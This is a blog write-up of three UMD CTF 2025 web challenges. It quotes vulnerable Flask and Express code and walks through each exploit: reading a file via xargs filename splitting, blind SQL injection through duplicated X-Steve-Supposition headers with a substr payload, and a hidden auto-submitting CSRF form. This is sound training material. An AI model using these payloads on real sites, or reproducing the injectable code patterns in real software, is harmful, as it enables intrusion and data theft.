---
title: UMD CTF 2025 - WEB
date: 2025-04-27
tags: [ctf, web]
categories: [CTF Writeups]
author: 2Fa0n
img_path: /assets/img/umd-ctf_2025
image: /assets/img/umd-ctf_2025/umd_banner.png
---

# Web
## brainrot-dictionary
**Solvers:** 199 <br>
**Author:** aparker

### Description
This website will help you understand the rest of the nonsense going on in the CTF. You can even upload your own brainrot words and get definitions! <br>
![image](/assets/img/umd-ctf_2025/brainrot_dictionary.png)

### Solution
This website can only upload file with `.brainrot` extension. Let's create a `test.brainrot` file and upload it. <br>

![image](/assets/img/umd-ctf_2025/brainrot_upload.png)
![image](/assets/img/umd-ctf_2025/brainrot_upload2.png)

After uploading, we can see that we redirected to `/dict` endpoint which shows list of brainrot words. <br>
Let's look through the `main.py` provided by the challenge. <br>
```python
from flask import Flask, render_template, request, redirect, session, url_for, send_from_directory
import os
import re
import random
import string
from werkzeug.utils import secure_filename
from urllib.parse import unquote

app = Flask(__name__)
app.secret_key = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1000

# Directory to save uploaded files and images
UPLOAD_FOLDER = 'uploads'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def create_uploads_dir(d=None):
    dirname = os.path.join(UPLOAD_FOLDER, ''.join(random.choices(string.ascii_letters, k=30)))
    if d is not None:
        dirname = d
    session['upload_dir'] = dirname
    os.mkdir(dirname)
    os.popen(f'cp flag.txt {dirname}')
    os.popen(f'cp basedict.brainrot {dirname}')

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'user_file' not in request.files:
            return render_template('index.html', error="L + RATIO + YOU FELL OFF")
        user_file = request.files['user_file']
        if not user_file.filename.endswith('.brainrot'):
            return render_template('index.html', error="sorry bruv that aint brainrotted enough")
        if 'upload_dir' not in session:
            create_uploads_dir()
        elif not os.path.isdir(session['upload_dir']):
            create_uploads_dir(session['upload_dir'])
        fname = unquote(user_file.filename)
        if '/' in fname:
            return render_template("index.html", error="dont do that")
        user_file.save(os.path.join(session['upload_dir'], fname))
        return redirect(url_for('dict'))
    return render_template('index.html')

@app.route('/dict')
def dict():
    if 'upload_dir' not in session:
        create_uploads_dir()
    elif not os.path.isdir(session['upload_dir']):
        create_uploads_dir(session['upload_dir'])

    cmd = f"find {session['upload_dir']} -name \\*.brainrot | xargs sort | uniq"
    results = os.popen(cmd).read()
    return render_template('dict.html', results=results.splitlines())



if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0")
```

We found these part interesting:
```python
# When initializing the session
def create_uploads_dir(d=None):
    dirname = os.path.join(UPLOAD_FOLDER, ''.join(random.choices(string.ascii_letters, k=30)))
    if d is not None:
        dirname = d
    session['upload_dir'] = dirname
    os.mkdir(dirname)
    os.popen(f'cp flag.txt {dirname}')  # Copy flag.txt to the upload directory
    os.popen(f'cp basedict.brainrot {dirname}')  # Copy the default dictionary

# Route to display the dictionary list
@app.route('/dict')
def dict():
    # ...
    cmd = f"find {session['upload_dir']} -name \\*.brainrot | xargs sort | uniq"
    results = os.popen(cmd).read()
    # ...
```

They used `find {session['upload_dir']} -name \*.brainrot | xargs sort | uniq` to:
- Finds all files with the `.brainrot` extension in the specified directory
- `xargs sort`: Takes the list of filenames from the find output as arguments for the sort command
- `uniq`: Removes duplicate files

When look through definition of `xargs` on [man page](https://man7.org/linux/man-pages/man1/xargs.1.html), it uses whitespace to separate arguments. It means that when a filename contains whitespace, `xargs` treats it as multiple separate arguments.

![image](/assets/img/umd-ctf_2025/xargs_man.png)

So what if we upload a file with whitespace in the filename? <br>

![image](/assets/img/umd-ctf_2025/brainrot_upload3.png)
![image](/assets/img/umd-ctf_2025/brainrot_upload4.png)

As we can see, it show the flag. Here is the flow of the find command when uploading `flag.txt basedict.brainrot`:
- When it execute command: `find uploads/AbCdEf -name *.brainrot` -> it will be: `uploads/AbCdEf/flag.txt basedict.brainrot`
- After passing to `xargs sort`: `xargs` considers `uploads/AbCdEf/flag.txt` and `basedict.brainrot` as two separate arguments
- The `sort` command will attempt to read the contents of both `uploads/AbCdEf/flag.txt` and `basedict.brainrot`
-> So as the result, the content of the `flag.txt` will be read and displayed.

**Flag:** `UMDCTF{POSIX_no_longer_recommends_that_this_is_possible}`

## Steve Le Poisson
**Solvers:** 139 <br>
**Author:** tahmid-23

### Description
il est orange <br>
![image](/assets/img/umd-ctf_2025/steve_le_poisson.png)

### Solution
This website use French language, pretty interesting =)). Let's dive into the `index.js` file provided by the challenge. <br>
```js
// üì¶ Importation des modules n√©cessaires pour faire tourner notre monde sous-marin num√©rique
const express = require("express");   // Express, le cadre web minimaliste mais puissant
const sqlite3 = require("sqlite3");   // SQLite version brute, pour les bases de donn√©es l√©g√®res
const sqlite = require("sqlite");     // Une interface moderne (promesse-friendly) pour SQLite
const cors = require("cors");         // Pour permettre √† d'autres domaines de parler √† notre serveur ‚Äî Steve est sociable, mais pas trop

// üê† Cr√©ation de l'application Express : c‚Äôest ici que commence l‚Äôaventure
const app = express();

// üß™ Fonction de validation des en-t√™tes HTTP
// Steve, ce poisson √† la sensibilit√© exacerb√©e, d√©teste les en-t√™tes trop longs, ambigus ou myst√©rieux
function checkBadHeader(headerName, headerValue) {
    return headerName.length > 80 || 
           (headerName.toLowerCase() !== 'user-agent' && headerValue.length > 80) || 
           headerValue.includes('\0'); // Le caract√®re nul ? Un blasph√®me pour Steve.
}

// üõü Middleware pour autoriser les requ√™tes Cross-Origin
app.use(cors());

// üßô Middleware maison : ici, Steve le Poisson filtre les requ√™tes selon ses principes aquatiques
app.use((req, res, next) => {
    let steveHeaderValue = null; // On pr√©pare le terrain pour r√©cup√©rer l‚Äôen-t√™te sacr√©
    let totalHeaders = 0;        // Pour compter ‚Äî car Steve compte. Tout. Toujours.

    // üîç Parcours des en-t√™tes bruts, deux par deux (cl√©, valeur)
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
        let headerName = req.rawHeaders[i];
        let headerValue = req.rawHeaders[i + 1];

        // ‚ùå Si un en-t√™te ne pla√Æt pas √† Steve, il coupe net la communication
        if (checkBadHeader(headerName, headerValue)) {
            return res.status(403).send(`Steve le poisson, un animal marin d‚Äôapparence inoffensive mais d‚Äôopinion tranch√©e, n‚Äôa jamais vraiment support√© tes en-t√™tes HTTP. Chaque fois qu‚Äôil en voit passer un ‚Äî m√™me sans savoir de quoi il s‚Äôagit exactement ‚Äî son ≈ìil vitreux se plisse, et une sorte de grondement bouillonne dans ses branchies. Ce n‚Äôest pas qu‚Äôil les comprenne, non, mais il les sent, il les ressent dans l‚Äôeau comme une vibration mal align√©e, une dissonance num√©rique qui le met profond√©ment mal √† l‚Äôaise. Il dit souvent, en tournoyant d‚Äôun air dramatique : ¬´ Pourquoi tant de formalisme ? Pourquoi cacher ce qu‚Äôon est vraiment derri√®re des cha√Ænes de caract√®res obscures ? ¬ª Pour lui, ces en-t√™tes sont comme des algues synth√©tiques : inutiles, pr√©tentieuses, et surtout √©trang√®res √† la fluidit√© du monde sous-marin. Il pr√©f√©rerait mille fois un bon vieux flux binaire brut, sans tous ces ornements absurdes. C‚Äôest une affaire de principe.`); // Message dramatique de Steve
        }

        // üîÆ Si on trouve l‚Äôen-t√™te "X-Steve-Supposition", on le garde
        if (headerName.toLowerCase() === 'x-steve-supposition') {
            steveHeaderValue = headerValue;
        } 

        totalHeaders++; // üßÆ On incr√©mente notre compteur de verbosit√© HTTP
    }

    // üßª Trop d‚Äôen-t√™tes ? Steve explose. Litt√©ralement.
    if (totalHeaders > 30) {
        return res.status(403).send(`Steve le poisson, qui est orange avec de longs bras muscl√©s et des jambes nerveuses, te fixe avec ses grands yeux globuleux. "Franchement," grogne-t-il en agitant une nageoire transform√©e en doigt accusateur, "tu abuses. Beaucoup trop d‚Äôen-t√™tes HTTP. Tu crois que c‚Äôest un concours ? Chaque requ√™te que tu envoies, c‚Äôest un roman. Moi, je dois nager dans ce flux verbeux, et c‚Äôest moi qui me noie ! T‚Äôas entendu parler de minimalisme ? Non ? Et puis c‚Äôest quoi ce d√©lire avec des en-t√™tes dupliqu√©s ? Tu crois que le serveur, c‚Äôest un psy, qu‚Äôil doit tout √©couter deux fois ? Retiens-toi la prochaine fois, ou c‚Äôest moi qui coupe la connexion."`); // Encore un monologue dramatique de Steve
    }

    // üôÖ‚Äç‚ôÇÔ∏è L‚Äôen-t√™te sacr√© est manquant ? Blasph√®me total.
    if (steveHeaderValue === null) {
        return res.status(400).send(`Steve le poisson, toujours orange et furibond, bondit hors de l‚Äôeau avec ses jambes fl√©chies et ses bras crois√©s. "Non mais s√©rieusement," r√¢le-t-il, "o√π est pass√© l‚Äôen-t√™te X-Steve-Supposition ? Tu veux que je devine tes intentions ? Tu crois que je lis dans les paquets TCP ? Cet en-t√™te, c‚Äôest fondamental ‚Äî c‚Äôest l√† que tu d√©clares tes hypoth√®ses, tes intentions, ton respect pour le protocole sacr√© de Steve. Sans lui, je suis perdu, confus, d√©sorient√© comme un poisson hors d‚Äôun proxy.`);
    }

    // üß™ Validation de la structure de la supposition : uniquement des caract√®res honorables
    if (!/^[a-zA-Z0-9{}]+$/.test(steveHeaderValue)) {
        return res.status(403).send(`Steve le poisson, ce poisson orange √† la peau luisante et aux nageoires muscl√©es, unique au monde, capable de nager sur la terre ferme et de marcher dans l'eau comme si c‚Äô√©tait une moquette moelleuse, te regarde avec ses gros yeux globuleux remplis d‚Äôune indignation abyssale. Il claque de la langue ‚Äì oui, car Steve a une langue, et elle est tr√®s expressive ‚Äì en te voyant saisir ta supposition dans le champ pr√©vu, un champ sacr√©, un espace r√©serv√© aux caract√®res honorables, alphab√©tiques et num√©riques, et toi, mis√©rable bip√®de aux doigts t√©m√©rairement chaotiques, tu as os√© y glisser des signes de ponctuation, des tilde, des di√®ses, des dollars, comme si c‚Äô√©tait une brocante de symboles oubli√©s. Tu crois que c‚Äôest un terrain de jeu, hein ? Mais pour Steve, ce champ est un pacte silencieux entre l‚Äôhumain et la machine, une zone de puret√© syntaxique. Et te voil√†, en train de profaner cette convention sacr√©e avec ton ‚Äú%‚Äù et ton ‚Äú@‚Äù, comme si les r√®gles n‚Äô√©taient que des suggestions. Steve bat furieusement des pattes arri√®re ‚Äì car oui, il a aussi des pattes arri√®re, pour la traction tout-terrain ‚Äì et fait jaillir de petites √©claboussures d‚Äô√©cume terrestre, signe supr√™me de sa col√®re. ‚ÄúPourquoi ?‚Äù te demande-t-il, avec une voix grave et solennelle, comme un vieux capitaine marin √©chou√© dans un monde digital, ‚ÄúPourquoi chercher la dissonance quand l‚Äôharmonie suffisait ? Pourquoi saboter la beaut√© simple de ‚ÄòazAZ09‚Äô avec tes gribouillages postmodernes ?‚Äù Et puis il s‚Äôapproche, les yeux pliss√©s, et te lance d‚Äôun ton sec : ‚ÄúTu n‚Äôes pas digne de l‚Äôen-t√™te X-Steve-Supposition. Reviens quand tu sauras deviner avec dignit√©.`);
    }

    // ‚úÖ Si tout est bon, Steve laisse passer la requ√™te
    next();
});

// üîç Point d'entr√©e principal : route GET pour "deviner"
app.get('/deviner', async (req, res) => {
    // üìÇ Ouverture de la base de donn√©es SQLite
    const db = await sqlite.open({
        filename: "./database.db",           // Chemin vers la base de donn√©es
        driver: sqlite3.Database,            // Le moteur utilis√©
        mode: sqlite3.OPEN_READONLY          // j'ai oublieÃÅ cÃßa
    });

    // üìã Ex√©cution d'une requ√™te SQL : on cherche si la supposition de Steve est correcte
    const rows = await db.all(`SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'`);

    res.status(200); // üëç Tout va bien, en apparence

    // üß† Si aucune ligne ne correspond, Steve se moque gentiment de toi
    if (rows.length === 0) {
        res.send("Bah, tu as tort."); // Pas de flag pour toi
    } else {
        res.send("Tu as raison!");    // Le flag √©tait bon. Steve t‚Äôaccorde son respect.
    }
});

// üö™ On lance le serveur, tel un aquarium ouvert sur le monde
const PORT = 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Serveur en √©coute sur http://localhost:${PORT}`);
});
```

After go through the code, we found the endpoint `/deviner` which have a SQL query that it will checks if our guess matches the flag stored in the database. <br>
```js
const rows = await db.all(`SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'`);
```

We can see that `x-steve-supposition` header and directly inserts it into an SQL query without sanitization -> leads to simple SQL injection. <br>
But when we look that the if statement:
```js
// üß™ Validation de la structure de la supposition : uniquement des caract√®res honorables
    if (!/^[a-zA-Z0-9{}]+$/.test(steveHeaderValue)) {
        return res.status(403).send(`Steve le poisson, ce poisson orange √† la peau luisante et aux nageoires muscl√©es, unique au monde, capable de nager sur la terre ferme et de marcher dans l'eau comme si c‚Äô√©tait une moquette moelleuse, te regarde avec ses gros yeux globuleux remplis d‚Äôune indignation abyssale. Il claque de la langue ‚Äì oui, car Steve a une langue, et elle est tr√®s expressive ‚Äì en te voyant saisir ta supposition dans le champ pr√©vu, un champ sacr√©, un espace r√©serv√© aux caract√®res honorables, alphab√©tiques et num√©riques, et toi, mis√©rable bip√®de aux doigts t√©m√©rairement chaotiques, tu as os√© y glisser des signes de ponctuation, des tilde, des di√®ses, des dollars, comme si c‚Äô√©tait une brocante de symboles oubli√©s. Tu crois que c‚Äôest un terrain de jeu, hein ? Mais pour Steve, ce champ est un pacte silencieux entre l‚Äôhumain et la machine, une zone de puret√© syntaxique. Et te voil√†, en train de profaner cette convention sacr√©e avec ton ‚Äú%‚Äù et ton ‚Äú@‚Äù, comme si les r√®gles n‚Äô√©taient que des suggestions. Steve bat furieusement des pattes arri√®re ‚Äì car oui, il a aussi des pattes arri√®re, pour la traction tout-terrain ‚Äì et fait jaillir de petites √©claboussures d‚Äô√©cume terrestre, signe supr√™me de sa col√®re. ‚ÄúPourquoi ?‚Äù te demande-t-il, avec une voix grave et solennelle, comme un vieux capitaine marin √©chou√© dans un monde digital, ‚ÄúPourquoi chercher la dissonance quand l‚Äôharmonie suffisait ? Pourquoi saboter la beaut√© simple de ‚ÄòazAZ09‚Äô avec tes gribouillages postmodernes ?‚Äù Et puis il s‚Äôapproche, les yeux pliss√©s, et te lance d‚Äôun ton sec : ‚ÄúTu n‚Äôes pas digne de l‚Äôen-t√™te X-Steve-Supposition. Reviens quand tu sauras deviner avec dignit√©.`);
    }
```

This regex prevents us from using typical SQL injection characters like quotes, semicolons, hyphens, or spaces. And only allows alphanumeric characters and curly braces. <br>
Let's go through how **Express** handles headers: <br>
1. When using `req.get("x-steve-supposition")` in the SQL query, Express returns the **first instance** of this header.
2. When validating the header with regex, Express stores the last value of this header in `steveHeaderValue`.

And we also found other interesting things is that `req.rawHeaders` will store all the headers in the order they were received. <br>

![image](/assets/img/umd-ctf_2025/raw_headers.png)

So what if:
- First header, we inject the sqli payload.
- Second header, we just put a alphanumeric value to pass the regex check.
```js
// Check headers one by one in a loop
for (let i = 0; i < req.rawHeaders.length; i += 2) {
    let headerName = req.rawHeaders[i];
    let headerValue = req.rawHeaders[i + 1];
    
    // Store the last value seen for this header
    if (headerName.toLowerCase() === 'x-steve-supposition') {
        steveHeaderValue = headerValue;
    }
}

// Validate regex on the last value seen
if (!/^[a-zA-Z0-9{}]+$/.test(steveHeaderValue)) {
    // Return error
}
```

Let's try it out:

![image](/assets/img/umd-ctf_2025/request1.png)

Hmm, check the code again this part:
```js
function checkBadHeader(headerName, headerValue) {
    return headerName.length > 80 || 
           (headerName.toLowerCase() !== 'user-agent' && headerValue.length > 80) || 
           headerValue.includes('\0'); // Le caract√®re nul ? Un blasph√®me pour Steve.
}
```

The `Accept` and `User-Agent` header have passed the limit length. So what if we remove them? <br>

![image](/assets/img/umd-ctf_2025/request2.png)

It works! Now we can inject our payload. Let's try the sqlite version as we seen that the code use `sqlite3.Database` as the driver. <br>

![image](/assets/img/umd-ctf_2025/request3.png)

Shows `Tu as raison!` means `You're right!` but we can not see the sqlite version. So this could be a blind conditional sqli. <br>

From the SQL query, we can see that the column name is `value` and the table name is `flag`. Let's extract using `substr` to bruteforce each position of the flag. <br>

The flag format is `UMDCTF{...}` so let's first try the `substr` position 1 is `U` to make sure our exploit is working. <br>

![image](/assets/img/umd-ctf_2025/request4.png)

Great, it works! Now let's try to extract the rest of the flag. We will use the burp intruder to exploit this. <br>
Then use the `clusterbomb` attack type and add `$$` to these value:
```
X-Steve-Supposition: ' OR substr(value,$1$,1) = '$U$' -- 
```

- For the first `$1$`, we will use payload type `Numbers` and range from `1 -> 30`.
- Then for the second `$U$`, we will use `Simple list` and use this list `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_`.
- Last part will add `Tu as raison!` to the `Grep - Match` to make it easier to filter for correct response.

![image](/assets/img/umd-ctf_2025/request5.png)

After running the attack, we use `Payload 1` for the position and `Payload 2` for the character. <br>

![image](/assets/img/umd-ctf_2025/request6.png)

Finally, we get the flag. <br>

**Flag:** `UMDCTF{ile5TVR4IM3NtTresbEAu}`

## A Minecraft Movie
**Solvers:** 58 <br>
**Author:** tahmid-23

### Description
I...AM STEVE!
![image](/assets/img/umd-ctf_2025/minecraft_movie.png)
![image](/assets/img/umd-ctf_2025/minecraft_movie_admin.png)

### Solution
First let go through the application and also watch requests through burp suite. So let's start register account and create a post. <br>

![image](/assets/img/umd-ctf_2025/register.png)

After create an account, we check that our `session number` is `undefined`.

![image](/assets/img/umd-ctf_2025/session_undefined.png)

At the homepage, we can see some `Top Minecraft Movie Posts`. Let's check some posts and discover something interesting. <br>

![image](/assets/img/umd-ctf_2025/post_1.png)

We get `postId=58eb18f6-1fb8-455c-b0cb-b764ec1f7048` and look through, we notice `This post was liked by an admin!`, so what if we like or dislike this post? <br>

![image](/assets/img/umd-ctf_2025/like_post.png)
![image](/assets/img/umd-ctf_2025/request_legacy_post.png)

There is two requests which are `/start-session` and `/legacy-social` that we can see that our `sessionNumber=1`. <br>

![image](/assets/img/umd-ctf_2025/session_number.png)

So confirm that our session number is `1`. And we are curious about the `legacy-social` request. Let's check it out. <br>
```js
, R = O.useCallback(async C => {
        await W0();
        const G = await fetch(`${na}/legacy-social`, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `sessionNumber=${window.sessionNumber}&postId=${s}&likes=${C}`,
            credentials: "include"
        });
        if (!G.ok) {
            S(await G.text());
            return
        }
        await h()
    }
```

We found out that:
- Uses form-urlencoded format instead of JSON which could lead to easily create request with HTML form.
- No CSRF protection that attacker could forge the request because server does not verify the authenticity of the request.
- Relies on client-side session so attacker can forge this session number.

Also found this part for content sanitization limitation:
```js
const Y = rh.sanitize(f.content, {
    ADD_TAGS: ["iframe"],
    ADD_ATTR: ["allow", "allowfullscreen", "frameborder", "scrolling", "src", "width", "height"]
});

O.useEffect(() => {
    rh.addHook("uponSanitizeElement", (s, f) => {
        var d;
        f.tagName === "iframe" && s instanceof Element && ((s.getAttribute("src") || "").startsWith("https://www.youtube.com/embed/") || (d = s.parentNode) == null || d.removeChild(s))
    })
})
```

From observation:
- Allows `iframe` tags but only from YouTube embeds
- For the content santitization, attacker can use `form` tag to create CSRF attack.

We also found suspicious part:

![image](/assets/img/umd-ctf_2025/suspicious_part.png)

which means this endpoint could be vulnerable that current implementation is insecure due to:
- Use `dangerouslySetInnerHTML` as a red flag in security audit.
- Instead of using state management, it uses global `window.sessionNumber`.

Gathering all the information, now let's create a normal post first. <br>

![image](/assets/img/umd-ctf_2025/create_post.png)
![image](/assets/img/umd-ctf_2025/request_create_post.png)

We can see that the body part of the request `/create-post` is:
```json
{
    "title":"alex",
    "content":"hi steve"
}
```

And following that is the `postId` which is `6400f205-4759-4593-a258-1a30b64418ae`. We can like and dislike and it will show two requests we have discussed before. But noticed that our post does not have like by admin. <br>

![image](/assets/img/umd-ctf_2025/post_admin.png)

while the other post has liked by admin. So if we make admin like our post, we can get the flag. <br>

![image](/assets/img/umd-ctf_2025/request_like_post.png)

Gathering all the information, we can create a CSRF attack flow:
- Create a normal post to grab that `postId`.
- Then create another post with CSRF payload and pointer to our normal post.
- Submit the post contain CSRF payload to admin so that admin by change will like our normal post.

So we have create a normal post already, let's create another one with CSRF payload:
```json
{
  "title": "hehe",
  "content": "<div class=\"flex justify-center\"><form action=\"https://a-minecraft-movie-api.challs.umdctf.io/legacy-social\" method=\"POST\"><input name=\"sessionNumber\" value=\"1\"><input name=\"postId\" value=\"6400f205-4759-4593-a258-1a30b64418ae\"><input name=\"likes\" value=\"1\"><input type=\"submit\" autofocus style=\"position:fixed;top:0;left:0;width:100%;height:100%;opacity:0\"></form></div>"
}
```

with the `autofocus` attribute to make the form submit automatically when the page loads. <br>

![image](/assets/img/umd-ctf_2025/create_post_csrf.png)

Now, submit this `postId`:`fe7fcd04-4476-4bce-a8f6-11dccc9175a1` to admin. <br>

![image](/assets/img/umd-ctf_2025/request_like_post_admin.png)

When check again our normal post, we got admin liked it. <br>

![image](/assets/img/umd-ctf_2025/post_admin_liked.png)

Check out `/account` endpoint, we can see the flag. <br>

![image](/assets/img/umd-ctf_2025/request_account.png)

**Flag:** `UMDCTF{I_y3@RNeD_f0R_7HE_Min3S}`